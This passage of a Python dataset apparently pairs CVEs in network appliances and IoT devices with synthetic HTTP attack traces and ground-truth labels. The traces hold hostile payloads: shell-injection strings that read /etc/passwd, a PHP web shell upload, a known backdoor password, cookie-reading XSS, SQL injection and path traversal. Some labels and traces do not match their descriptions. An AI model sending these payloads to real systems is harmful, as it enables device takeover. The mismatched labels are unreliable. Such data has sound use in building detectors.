        "trace": {"request": {"method": "POST", "path": "/dana-admin/cached/setup/setupPhase.cgi", "params": {}, "headers": {"Content-Type": "multipart/form-data; boundary=----Boundary", "Cookie": "DSID=valid_admin"}, "body": "------Boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.tgz\"\r\nContent-Type: application/gzip\r\n\r\nmalicious\r\n------Boundary--"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": ""}},
        "ground_truth": {"sink_param": "file", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-8260", "reasoning": "Unrestricted file upload in admin portal leads to RCE. Pulse Connect Secure 9.1R.x."}
    },
    {
        "cve_id": "CVE-2021-22893", "vendor": "Ivanti", "product": "Pulse Connect Secure", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/dana-ws/namedusers", "params": {}, "headers": {"Content-Type": "application/xml"}, "body": "<?xml version=\"1.0\"?><request><username>admin</username></request>"}, "response": {"status_code": 200, "headers": {"Content-Type": "application/xml"}, "body": ""}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-22893", "reasoning": "Use-after-free in Pulse Connect Secure. Pre-auth RCE via Windows File Share Browser/Pulse Secure Collaboration. APT exploitation."}
    },
    {
        "cve_id": "CVE-2021-22894", "vendor": "Ivanti", "product": "Pulse Connect Secure", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/dana/fb/smb/wfb.cgi", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "DSID=valid"}, "body": "laession=1&operation=getBookmarks"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": ""}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-22894", "reasoning": "Buffer overflow in Pulse Connect Secure Collaboration Suite. Authenticated RCE."}
    },
    {
        "cve_id": "CVE-2021-22899", "vendor": "Ivanti", "product": "Pulse Connect Secure", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/dana/fb/smb/wfb.cgi", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "DSID=valid"}, "body": "laession=1&operation=deletefile&txtBkSession=`cat /etc/passwd`"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/bash\n"}},
        "ground_truth": {"sink_param": "txtBkSession", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-22899", "reasoning": "Command injection via Windows File Resource Profiles. Authenticated RCE. Pulse Connect Secure."}
    },
    {
        "cve_id": "CVE-2021-22900", "vendor": "Ivanti", "product": "Pulse Connect Secure", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/dana-admin/cert/admincert.cgi", "params": {}, "headers": {"Content-Type": "multipart/form-data; boundary=----Boundary", "Cookie": "DSID=admin"}, "body": "------Boundary\r\nContent-Disposition: form-data; name=\"cert\"; filename=\"cert.tar\"\r\nContent-Type: application/x-tar\r\n\r\nmalicious_archive\r\n------Boundary--"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": ""}},
        "ground_truth": {"sink_param": "cert", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-22900", "reasoning": "Unrestricted file upload in admin certificate import leads to RCE. Pulse Connect Secure."}
    },
    {
        "cve_id": "CVE-2021-44529", "vendor": "Ivanti", "product": "EPM CSA", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/gsb/reports.php", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "reportName=test;cat /etc/passwd"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/bash\n"}},
        "ground_truth": {"sink_param": "reportName", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-44529", "reasoning": "Code injection in Ivanti EPM Cloud Services Appliance. Unauthenticated RCE. CVSS 9.8."}
    },
    {
        "cve_id": "CVE-2023-38035", "vendor": "Ivanti", "product": "Sentry", "vuln_class": "AuthBypass",
        "trace": {"request": {"method": "POST", "path": "/mics/services/MICSService", "params": {}, "headers": {"Content-Type": "application/xml"}, "body": "<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName></methodCall>"}, "response": {"status_code": 200, "headers": {"Content-Type": "application/xml"}, "body": "<methodResponse><params><param><value><array></array></value></param></params></methodResponse>"}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-38035", "reasoning": "Auth bypass in MICS admin portal allows unauthenticated API access. Ivanti Sentry (MobileIron). CVSS 9.8."}
    },
    {
        "cve_id": "CVE-2024-21893", "vendor": "Ivanti", "product": "Connect Secure", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/dana-ws/saml20/login.ws", "params": {}, "headers": {"Content-Type": "text/xml"}, "body": "<?xml version=\"1.0\"?><samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"><samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status></samlp:Response>"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": ""}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-21893", "reasoning": "SSRF in SAML component allows accessing backend resources. Ivanti Connect Secure, Policy Secure, Neurons for ZTA."}
    },
    {
        "cve_id": "CVE-2024-7593", "vendor": "Ivanti", "product": "Virtual Traffic Manager", "vuln_class": "AuthBypass",
        "trace": {"request": {"method": "GET", "path": "/apps/zxtm/login.cgi", "params": {}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "admin panel"}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-7593", "reasoning": "Auth bypass allows unauthenticated admin access to Ivanti Virtual Traffic Manager (vTM). CVSS 9.8."}
    },
    {
        "cve_id": "CVE-2024-9379", "vendor": "Ivanti", "product": "CSA", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/gsb/reports.php", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "PHPSESSID=valid"}, "body": "reportName=test' OR 1=1--"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": ""}},
        "ground_truth": {"sink_param": "reportName", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-9379", "reasoning": "SQL injection in Ivanti CSA admin portal. Authenticated attacker can run arbitrary SQL. Chained with CVE-2024-8963."}
    },
    # ===== Juniper (8) =====
    {
        "cve_id": "CVE-2015-7755", "vendor": "Juniper", "product": "ScreenOS", "vuln_class": "AuthBypass",
        "trace": {"request": {"method": "POST", "path": "/login", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "username=any&password=<<< %s(un='%s') = %u"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "admin session"}},
        "ground_truth": {"sink_param": "password", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2015-7755", "reasoning": "Backdoor password <<< %s(un='%s') = %u grants admin access to any ScreenOS device. Juniper ScreenOS 6.2.0r15-6.2.0r18, 6.3.0r12-6.3.0r20."}
    },
    {
        "cve_id": "CVE-2020-1631", "vendor": "Juniper", "product": "Junos OS", "vuln_class": "CMDi",
        "trace": {"request": {"method": "GET", "path": "/jsonrpc", "params": {}, "headers": {"Content-Type": "application/json"}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{}"}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-1631", "reasoning": "LFI and RCE via J-Web HTTP daemon. Crafted HTTP request to read files or execute code. Junos OS all versions."}
    },
    {
        "cve_id": "CVE-2023-36844", "vendor": "Juniper", "product": "Junos OS", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/webauth_operation.php", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "rs=do_upload&rsargs[]=/var/tmp/&rsargs[]=test.php&rsargs[]=<?php system($_GET['cmd']); ?>"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": ""}},
        "ground_truth": {"sink_param": "rsargs", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-36844", "reasoning": "PHP environment variable manipulation in J-Web. Modify PHPRC to control php.ini and execute code. EX/SRX series. CVSS 5.3 (but chained for RCE)."}
    },
    {
        "cve_id": "CVE-2023-36845", "vendor": "Juniper", "product": "Junos OS", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/webauth_operation.php", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "rs=do_upload&rsargs[]=/var/tmp/&rsargs[]=auto_prepend_file=/etc/passwd"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/sh\n"}},
        "ground_truth": {"sink_param": "rsargs", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-36845", "reasoning": "PHP environment variable manipulation for RCE. Craft php.ini via auto_prepend_file. EX/SRX series. Chained with CVE-2023-36844."}
    },
    {
        "cve_id": "CVE-2023-36846", "vendor": "Juniper", "product": "Junos OS", "vuln_class": "AuthBypass",
        "trace": {"request": {"method": "POST", "path": "/webauth_operation.php", "params": {}, "headers": {"Content-Type": "multipart/form-data; boundary=----Boundary"}, "body": "------Boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php system('id'); ?>\r\n------Boundary--"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": ""}},
        "ground_truth": {"sink_param": "file", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-36846", "reasoning": "Missing auth for critical function. Upload files via J-Web without auth. SRX series. Chained with CVE-2023-36845 for RCE."}
    },
    {
        "cve_id": "CVE-2023-36847", "vendor": "Juniper", "product": "Junos OS", "vuln_class": "AuthBypass",
        "trace": {"request": {"method": "POST", "path": "/webauth_operation.php", "params": {}, "headers": {"Content-Type": "multipart/form-data; boundary=----Boundary"}, "body": "------Boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php system('id'); ?>\r\n------Boundary--"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": ""}},
        "ground_truth": {"sink_param": "file", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-36847", "reasoning": "Missing auth for file upload in J-Web. EX series. Counterpart to CVE-2023-36846 (SRX)."}
    },
    {
        "cve_id": "CVE-2023-36851", "vendor": "Juniper", "product": "Junos OS", "vuln_class": "AuthBypass",
        "trace": {"request": {"method": "GET", "path": "/webauth_operation.php", "params": {"filename": "/var/tmp/test.php"}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "application/octet-stream"}, "body": "file content"}},
        "ground_truth": {"sink_param": "filename", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-36851", "reasoning": "Missing auth allows arbitrary file download in J-Web. SRX series. Variant of CVE-2023-36846."}
    },
    {
        "cve_id": "CVE-2025-21590", "vendor": "Juniper", "product": "Junos OS", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/api/v1/configuration", "params": {}, "headers": {"Content-Type": "application/json", "Authorization": "Basic"}, "body": "{\"config\":\"set system scripts\"}"}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"status\":\"ok\"}"}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-21590", "reasoning": "Improper isolation in Junos OS kernel allows local attacker to inject code. Authenticated local privilege escalation."}
    },
    # ===== Mitel (4) =====
    {
        "cve_id": "CVE-2022-29499", "vendor": "Mitel", "product": "MiVoice Connect", "vuln_class": "CMDi",
        "trace": {"request": {"method": "GET", "path": "/tp/cpe/index.cgi", "params": {"id": "0;cat /etc/passwd"}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/bash\n"}},
        "ground_truth": {"sink_param": "id", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2022-29499", "reasoning": "Pre-auth RCE via data validation flaw in Mitel Service Appliance. Used by Lorenz ransomware. CVSS 9.8."}
    },
    {
        "cve_id": "CVE-2022-40765", "vendor": "Mitel", "product": "MiVoice Connect", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/awcproxy/proxy.php", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "session=valid"}, "body": "method=test&param=;cat /etc/passwd"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/bash\n"}},
        "ground_truth": {"sink_param": "param", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2022-40765", "reasoning": "Authenticated command injection in Edge Gateway (MBG) component of MiVoice Connect."}
    },
    {
        "cve_id": "CVE-2022-41223", "vendor": "Mitel", "product": "MiVoice Connect", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/awcproxy/proxy.php", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "session=valid"}, "body": "method=uploadFile&filename=test;cat /etc/passwd"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/bash\n"}},
        "ground_truth": {"sink_param": "filename", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2022-41223", "reasoning": "Authenticated code injection in Edge Gateway component of MiVoice Connect."}
    },
    {
        "cve_id": "CVE-2024-41710", "vendor": "Mitel", "product": "SIP Phones", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/servlet/ConfigServlet", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded", "Authorization": "Basic YWRtaW46YWRtaW4="}, "body": "name=testparam&value=test$(cat /etc/passwd)"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": ""}},
        "ground_truth": {"sink_param": "value", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-41710", "reasoning": "Argument injection in Mitel 6800/6900/6900w SIP Phones boot process. Authenticated. Used by Aquabot botnet."}
    },
    # ===== NUUO (2) =====
    {
        "cve_id": "CVE-2018-14933", "vendor": "NUUO", "product": "NVRmini", "vuln_class": "CMDi",
        "trace": {"request": {"method": "GET", "path": "/__debugging_center_utils___.php", "params": {"log": ";cat /etc/passwd"}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/bash\n"}},
        "ground_truth": {"sink_param": "log", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://www.exploit-db.com/exploits/45070", "reasoning": "Pre-auth RCE via debugging utility endpoint. NUUO NVRmini 2 NVR. log parameter passed to shell."}
    },
    {
        "cve_id": "CVE-2022-23227", "vendor": "NUUO", "product": "NVRmini2", "vuln_class": "AuthBypass",
        "trace": {"request": {"method": "GET", "path": "/upload.php", "params": {}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "upload form"}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2022-23227", "reasoning": "Missing authentication in NUUO NVRmini2. Unauthenticated file upload leads to RCE. CVSS 9.8."}
    },
    # ===== Netis (1) =====
    {
        "cve_id": "CVE-2019-19356", "vendor": "Netis", "product": "WF2419", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/cgi-bin-igd/netcore_set.cgi", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded", "Authorization": "Basic YWRtaW46cGFzc3dvcmQ="}, "body": "mode=set&moduleGp=lanSetup&lanIP=127.0.0.1;cat /etc/passwd"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/sh\n"}},
        "ground_truth": {"sink_param": "lanIP", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2019-19356", "reasoning": "Authenticated command injection in Netis WF2419. lanIP parameter passed to shell."}
    },
    # ===== PTZOptics (2) =====
    {
        "cve_id": "CVE-2024-8956", "vendor": "PTZOptics", "product": "PT30X Cameras", "vuln_class": "CMDi",
        "trace": {"request": {"method": "GET", "path": "/cgi-bin/param.cgi", "params": {"get_device_conf": ""}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "text/plain"}, "body": "username=admin\npassword=admin"}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-8956", "reasoning": "Insufficient authentication in CGI API. Unauthenticated access to device config with credentials. PTZOptics cameras."}
    },
    {
        "cve_id": "CVE-2024-8957", "vendor": "PTZOptics", "product": "PT30X Cameras", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/cgi-bin/param.cgi", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "action=update&ntp_addr=;cat /etc/passwd;"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/sh\n"}},
        "ground_truth": {"sink_param": "ntp_addr", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-8957", "reasoning": "OS command injection in NTP configuration. Chained with CVE-2024-8956 for pre-auth RCE. PTZOptics cameras."}
    },
    # ===== Progress (1) =====
    {
        "cve_id": "CVE-2024-1212", "vendor": "Progress", "product": "Kemp LoadMaster", "vuln_class": "CMDi",
        "trace": {"request": {"method": "GET", "path": "/access/set", "params": {"param": "enableapi&value=1&un=bal%27%3Bcat /etc/passwd%3B%27"}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/bash\n"}},
        "ground_truth": {"sink_param": "un", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-1212", "reasoning": "Pre-auth OS command injection via /access/set API. Progress Kemp LoadMaster. un parameter passed to shell. CVSS 10.0."}
    },
    # ===== Pulse Secure (1) =====
    {
        "cve_id": "CVE-2020-8218", "vendor": "Pulse Secure", "product": "Pulse Connect Secure", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/dana/fb/smb/wfb.cgi", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "DSID=admin_session"}, "body": "laession=1&txtBkSession=`cat /etc/passwd`"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/bash\n"}},
        "ground_truth": {"sink_param": "txtBkSession", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-8218", "reasoning": "Authenticated code execution in admin portal. Pulse Connect Secure before 9.1R8."}
    },
    # ===== QNAP (8) + QNAP Systems (1) =====
    {
        "cve_id": "CVE-2018-19943", "vendor": "QNAP", "product": "NAS", "vuln_class": "Other",
        "trace": {"request": {"method": "GET", "path": "/cgi-bin/filemanager/utilRequest.cgi", "params": {"func": "download", "sid": "valid", "source": "<script>alert(1)</script>"}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "<script>alert(1)</script>"}},
        "ground_truth": {"sink_param": "source", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2018-19943", "reasoning": "Stored XSS in File Station. QNAP QTS NAS devices."}
    },
    {
        "cve_id": "CVE-2018-19949", "vendor": "QNAP", "product": "NAS", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/cgi-bin/filemanager/utilRequest.cgi", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "NAS_SID=valid"}, "body": "func=download&sid=valid&source_path=/tmp&source_file=test;cat /etc/passwd"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/sh\n"}},
        "ground_truth": {"sink_param": "source_file", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2018-19949", "reasoning": "Command injection in QTS NAS. Authenticated RCE via file manager utility."}
    },
    {
        "cve_id": "CVE-2018-19953", "vendor": "QNAP", "product": "NAS", "vuln_class": "Other",
        "trace": {"request": {"method": "GET", "path": "/cgi-bin/filemanager/utilRequest.cgi", "params": {"func": "download", "sid": "valid", "source": "<script>alert(document.cookie)</script>"}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "<script>alert(document.cookie)</script>"}},
        "ground_truth": {"sink_param": "source", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2018-19953", "reasoning": "XSS in File Station. QNAP QTS NAS. Similar to CVE-2018-19943."}
    },
    {
        "cve_id": "CVE-2019-7193", "vendor": "QNAP", "product": "QTS", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/photo/p/api/video.php", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "NAS_SID=valid"}, "body": "a=set498Profile&type=video&content=../../../../etc/passwd"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/sh\n"}},
        "ground_truth": {"sink_param": "content", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2019-7193", "reasoning": "Improper input validation in QTS Photo Station allows file injection. Authenticated."}
    },
    {
        "cve_id": "CVE-2020-2509", "vendor": "QNAP", "product": "NAS", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/cgi-bin/authLogin.cgi", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "user=admin&serviceKey=1&remme=1&pw=test;cat /etc/passwd"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/xml"}, "body": "root:x:0:0:root:/root:/bin/sh\n"}},
        "ground_truth": {"sink_param": "pw", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-2509", "reasoning": "Command injection in QTS NAS. Unauthenticated RCE via web server. Affects QTS, QuTS hero."}
    },
    {
        "cve_id": "CVE-2021-28799", "vendor": "QNAP", "product": "NAS", "vuln_class": "AuthBypass",
        "trace": {"request": {"method": "POST", "path": "/cgi-bin/authLogin.cgi", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "user=admin&serviceKey=1&remme=1&pw=backdoor_string"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/xml", "Set-Cookie": "NAS_SID=valid_session"}, "body": "<QDocRoot><authPassed>true</authPassed></QDocRoot>"}},
        "ground_truth": {"sink_param": "pw", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-28799", "reasoning": "Improper authorization (hardcoded credentials) in HBS 3 Hybrid Backup Sync. Used by Qlocker ransomware. QNAP NAS."}
    },
    {
        "cve_id": "CVE-2022-27593", "vendor": "QNAP", "product": "Photo Station", "vuln_class": "PT",
        "trace": {"request": {"method": "GET", "path": "/photo/p/api/photo.php", "params": {"a": "getExif", "f": "../../../../etc/passwd"}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "text/plain"}, "body": "root:x:0:0:root:/root:/bin/sh\n"}},
        "ground_truth": {"sink_param": "f", "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2022-27593", "reasoning": "Externally controlled reference to resource. Path traversal reads arbitrary files. Used by DeadBolt ransomware. QNAP Photo Station."}
    },
    {
        "cve_id": "CVE-2023-47565", "vendor": "QNAP", "product": "VioStor NVR", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/cgi-bin/pingb.cgi", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded", "Authorization": "Basic YWRtaW46YWRtaW4="}, "body": "ip=127.0.0.1;cat /etc/passwd&submit=Ping"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/sh\n"}},
        "ground_truth": {"sink_param": "ip", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-47565", "reasoning": "OS command injection in legacy QNAP VioStor NVR. Authenticated (default admin:admin). CVSS 8.0."}
    },
    {
        "cve_id": "CVE-2020-2506", "vendor": "QNAP", "product": "Helpdesk", "vuln_class": "AuthBypass",
        "trace": {"request": {"method": "GET", "path": "/helpdesk/backend/index.php", "params": {"action": "login", "username": "admin"}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "application/json"}, "body": "{\"status\":\"success\"}"}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2020-2506", "reasoning": "Improper access control in QNAP Helpdesk. Unauthenticated access to admin functions."}
    },
    # ===== Quest (2) =====
    {
        "cve_id": "CVE-2018-11138", "vendor": "Quest", "product": "KACE SMA", "vuln_class": "CMDi",
        "trace": {"request": {"method": "POST", "path": "/service/kbot_service.php", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "ID=1&action=kbot_upload&filename=test;cat /etc/passwd"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/bash\n"}},
        "ground_truth": {"sink_param": "filename", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2018-11138", "reasoning": "Unauthenticated command injection in Quest KACE SMA. kbot_service.php filename parameter."}
    },
    {
        "cve_id": "CVE-2025-32975", "vendor": "Quest", "product": "KACE SMA", "vuln_class": "AuthBypass",
        "trace": {"request": {"method": "GET", "path": "/service/admin.php", "params": {}, "headers": {}, "body": None}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "admin panel"}},
        "ground_truth": {"sink_param": None, "payload_encoding": "none", "payload_extraction": "direct", "source": "https://nvd.nist.gov/vuln/detail/CVE-2025-32975", "reasoning": "Authentication bypass in Quest KACE SMA 14.2 and below."}
    },
    # ===== Realtek (2) =====
    {
        "cve_id": "CVE-2014-8361", "vendor": "Realtek", "product": "SDK", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/picsdesc.xml", "params": {}, "headers": {"Content-Type": "text/xml", "SOAPAction": "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"}, "body": "<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewInternalClient>`cat /etc/passwd`</NewInternalClient></u:AddPortMapping></s:Body></s:Envelope>"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/xml"}, "body": "root:x:0:0:root:/root:/bin/sh\n"}},
        "ground_truth": {"sink_param": "NewInternalClient", "payload_encoding": "none", "payload_extraction": "xml_body", "source": "https://www.exploit-db.com/exploits/37169", "reasoning": "Realtek SDK miniigd UPnP SOAP command injection. Pre-auth. Affects routers using Realtek chipset (D-Link, Edimax, etc)."}
    },
    {
        "cve_id": "CVE-2021-35395", "vendor": "Realtek", "product": "AP-Router SDK", "vuln_class": "Other",
        "trace": {"request": {"method": "POST", "path": "/goform/formWsc", "params": {}, "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "pession=aaa&ifname=test&submit-url=%60cat+/etc/passwd%60"}, "response": {"status_code": 200, "headers": {"Content-Type": "text/html"}, "body": "root:x:0:0:root:/root:/bin/sh\n"}},
        "ground_truth": {"sink_param": "submit-url", "payload_encoding": "none", "payload_extraction": "shell_delimiter", "source": "https://nvd.nist.gov/vuln/detail/CVE-2021-35395", "reasoning": "Multiple vulns in Realtek Jungle SDK httpd: buffer overflow, command injection. submit-url in formWsc. Affects millions of IoT devices."}
    },
    # ===== Samsung (2) =====
    {
        "cve_id": "CVE-2024-7399", "vendor": "Samsung", "product": "MagicINFO 9", "vuln_class": "PT",
